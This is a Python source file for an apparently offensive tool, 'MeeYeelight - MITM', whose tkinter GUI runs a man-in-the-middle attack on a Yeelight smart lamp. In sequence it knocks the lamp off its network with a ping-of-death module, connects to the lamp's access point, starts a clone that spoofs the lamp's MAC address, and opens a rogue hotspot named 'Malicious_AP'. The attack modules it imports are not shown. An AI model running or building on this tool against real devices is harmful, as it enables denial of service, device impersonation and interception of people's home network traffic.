import tkinter as tk
import time
import os
from threading import *
from queue import Queue

from mitm.yeelight_connect import connect_to_yeelight
from mitm.deauth import Deauth
from mitm.ping_of_death import PingDeath
from hotspot.hotspot_controller import create_hotspot, create_malicious_yeelight
from hotspot.yeelight_socket import YeelightSocket


class GUI_MITM():
    def __init__(self, var):
        self._var = var
        self.root = tk.Tk(className="MeeYeelight - MITM")
        self.root.resizable(False, False)
        self.media_directory = os.getcwd() + "/media"
        self.queue = Queue()

        # Frames
        self.FRAME_deauth = tk.Frame(self.root, borderwidth=10)
        # Deauth SUB_FRAME_deauth
        self.LB_deauth_title = tk.Label(self.FRAME_deauth, text="MITM attack", font="bold")
        self.SUB_FRAME_deauth = tk.Frame(self.FRAME_deauth, pady=5)
        self.LB_deauth_yeelight = tk.Label(self.FRAME_deauth, text="✔ Deauthenticated Yeelight ✔")
        self.LB_connect_to_yeelight = tk.Label(self.FRAME_deauth, text="⌛ Connecting to Yeelight AP ⌛")
        self.LB_start_malicious_yeelight = tk.Label(self.FRAME_deauth, text="⌛ Starting Malicious Yeelight ⌛")
        self.LB_start_malicious_ap = tk.Label(self.FRAME_deauth, text="⌛ Starting Malicious AP ⌛")

        self.load_gui()

    def label_update(self, label):
        label['text'] = label['text'][:-1]
        label['text'] = label['text'][0:]
        label['text'] = "✔" + label['text'][1:] + "✔"
        self.root.update()


    def load_gui(self):
        self.FRAME_deauth.grid()
        self.LB_deauth_title.grid(row=0)
        self.SUB_FRAME_deauth.grid()
        self.FRAME_deauth.grid()
        self.root.update()

        # Deauth Yeelight out of main WLAN
        PingDeath(self._var.yeelight["ip"], self._var.interfaces["attack"])
        self.LB_deauth_yeelight.grid()
        self.root.update()

        # Connect to Yeelight with attack interface
        self.LB_connect_to_yeelight.grid()
        self.root.update()
        thread_yeelight_connection = Thread(target=connect_to_yeelight,
            args=(self._var.malicious_yeelight['ssid'],
                self._var.interfaces['attack'],))
        thread_yeelight_connection.name = 'yeelight_connection'
        thread_yeelight_connection.setDaemon(True)
        thread_yeelight_connection.start()
        thread_yeelight_connection.join()
        #thread_lamp_deauth.stop_deauth()
        self.label_update(self.LB_connect_to_yeelight)

        # Create Malicious Yeelight
        self.LB_start_malicious_yeelight.grid()
        self.root.update()
        thread_create_malicious_yeelight = Thread(target=create_malicious_yeelight, 
            args=(self._var.interfaces['malicious_yeelight'], 
                self._var.malicious_yeelight['ssid'], 
                self._var.malicious_yeelight['gateway'], 
                self._var.yeelight['mac'], ))
        thread_create_malicious_yeelight.name = 'create_malicious_yeelight'
        thread_create_malicious_yeelight.setDaemon(True)
        thread_create_malicious_yeelight.start()
        time.sleep(1)

        # Start Yeelight Connection Process
        YeelightSocket(self._var.interfaces['malicious_yeelight'],
                self._var.interfaces['attack'],
                self._var.malicious_yeelight['gateway'], 
                self._var.yeelight['mac'])
        self.label_update(self.LB_start_malicious_yeelight)

        # Create Malicious Access Point
        self.LB_start_malicious_ap.grid()
        self.root.update()
        thread_create_malicious_ap = Thread(target=create_hotspot, 
            args=(self._var.interfaces['hotspot'], 
                "Malicious_AP",
                "maliciousap123"))
        thread_create_malicious_ap.name = 'create_malicious_yeelight'
        thread_create_malicious_ap.setDaemon(True)
        thread_create_malicious_ap.start()
        self.label_update(self.LB_start_malicious_ap)
        self.root.update()

        self.root.mainloop()
